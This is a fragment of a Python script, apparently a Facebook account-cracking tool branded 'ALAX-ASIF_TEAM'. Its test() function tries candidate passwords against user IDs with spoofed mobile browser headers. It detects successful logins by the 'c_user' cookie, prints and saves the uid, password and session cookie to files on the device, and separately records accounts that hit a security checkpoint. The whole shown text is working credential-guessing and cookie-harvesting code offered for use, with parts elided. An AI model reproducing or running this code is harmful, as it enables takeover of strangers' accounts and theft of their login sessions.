...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mALAX-ASIF_TEAM-🥰\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="116.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[ALAX-ASIF_TEAM-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                oks.append(cid)
                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  A,  OK,  id"')
                open('/sdcard/ALAX-ASIF_TEAM-OK.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[ALAX-ASIF_TEAM-CP] {uid} ¤ {ps}")
                os.system('espeak -a 300 " oh shit Cp ID"')
                open('/sdcard/ALAX-ASIF_TEAM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
